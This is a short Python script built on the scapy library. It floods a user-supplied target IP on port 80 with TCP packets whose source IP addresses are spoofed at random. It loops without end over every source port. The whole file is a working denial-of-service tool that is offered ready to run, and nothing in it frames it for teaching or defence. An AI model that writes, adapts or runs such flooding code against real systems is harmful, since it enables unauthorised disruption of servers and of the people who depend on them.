"""
    A large number of packets are sent to web server by

    using multiple IPs and multiple ports.
"""

from scapy.all import *
import random

packetContent = "Hello World!";

targetIP = input("Enter IP address of target: ");

packetIP = 0;

def create_random_IP():
    a = str(random.randint(0, 255));
    b = str(random.randint(0, 255));
    c = str(random.randint(0, 255));
    d = str(random.randint(0, 255));
    dot = ".";
    return a + dot + b + dot + c + dot + d;

while (True):
    """ Create random soucre IP address """
    sourceIP = create_random_IP();

    """ Send large amount of packets from a source to a target IP address """
    for sourcePort in range (1, 65535):
        IP_Packet = IP(src = sourceIP, dst = targetIP);
        TCP_Packet = TCP(sport = sourcePort, dport = 80);
        packet = IP_Packet / TCP_Packet / packetContent;
        """ Send packets at layer 3 """
        send(packet, inter = 0.001);

        packetIP = packetIP + 1;
        print("Packet sent ", packetIP, " through port ", sourcePort);
